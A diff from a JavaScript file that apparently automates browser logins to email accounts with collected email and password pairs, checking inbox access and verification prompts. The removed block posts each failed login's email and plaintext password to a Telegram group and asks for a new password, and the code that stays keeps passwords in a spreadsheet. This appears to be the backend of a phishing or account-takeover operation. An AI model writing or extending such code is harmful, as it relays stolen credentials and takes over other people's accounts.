@@ -1013,56 +1013,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                   }
                               }
 
-                              // If a password attempt resulted in a password-specific failure or accountAccess=false,
-                              // transition back to WAITINGPASSWORD so the user can provide a new password.
-                              if (initialCheckResult.verificationState === 'WAITINGPASSWORD_ERROR' || (initialCheckResult.emailExists && !initialCheckResult.accountAccess && (initialCheckResult.verificationState === null || initialCheckResult.verificationState === undefined))) {
-                                  // **Telegram Notification for Incorrect Password**
-                                  logger.info(`[processRow][${browserId}] Password error detected during WAITINGPASSWORD. Sending Telegram notification.`);
-                                  const allDataForTelegram = await fetchDataFromAppScript();
-                                  const headersForTelegram = allDataForTelegram[0];
-                                  const columnIndexesForTelegram = getColumnIndexes(headersForTelegram);
-                                  const rowDataForTelegram = allDataForTelegram.slice(1).find(r => r[columnIndexesForTelegram['browserId']] === browserId);
 
-                                  if (rowDataForTelegram) {
-                                      const projectId = rowDataForTelegram[columnIndexesForTelegram['projectId']];
-                                      const storedPassword = rowDataForTelegram[columnIndexesForTelegram['password']];
-                                      if (projectId) {
-                                          const projectDetails = await getProjectDetails(projectId);
-                                          const projectTitle = projectDetails?.projectTitle || 'Unknown Project';
-                                          const telegramGroupId = projectDetails?.telegramGroupId;
-
-                                          if (telegramGroupId) {
-                                              let message = `🚨 *Login Failed: Incorrect Password* 🚨\n\n`;
-                                              message += `*Project:* ${projectTitle}\n`;
-                                              message += `*Email:* \`${email}\`\n`;
-                                              message += `*Password:* \`${storedPassword}\`\n`;
-                                              message += `*Browser ID:* \`${browserId}\`\n`;
-
-                                              await sendTelegramMessage(telegramGroupId, message);
-                                          }
-                                      }
-                                  }
-
-                                  logger.info(`[processRow][${browserId}] Password error detected during WAITINGPASSWORD. Setting status to WAITINGPASSWORD.`);
-                                  finalStatus = "WAITINGPASSWORD";
-                                  // Ensure updateData reflects the new status immediately so finally() sees it
-                                  updateData.status = finalStatus;
-                                  updateData.lastJsonResponse = JSON.stringify({
-                                      browserId, email, status: finalStatus,
-                                      emailExists: initialCheckResult.emailExists,
-                                      accountAccess: initialCheckResult.accountAccess,
-                                      reachedInbox: initialCheckResult.reachedInbox,
-                                      requiresVerification: initialCheckResult.requiresVerification,
-                                      verificationState: initialCheckResult.verificationState,
-                                      verificationOptions: initialCheckResult.verificationOptions || [],
-                                      platform, timestamp: new Date().toISOString(),
-                                      message: initialCheckResult.message || "Incorrect password. Please provide a valid password."
-                                  });
-                                  // Clear the password field and persist the WAITINGPASSWORD state
-                                  logger.debug(`[processRow][${browserId}] Clearing password. Returning to WAITINGPASSWORD state.`);
-                                  await updateBrowserRowData(browserId, { ...updateData, password: '' });
-                                  return; // Exit processRow so no later logic overwrites status
-                              }
 
                               passwordProvidedAndProcessed = true;
                               // Do not clear password from sheet after attempt as per user request
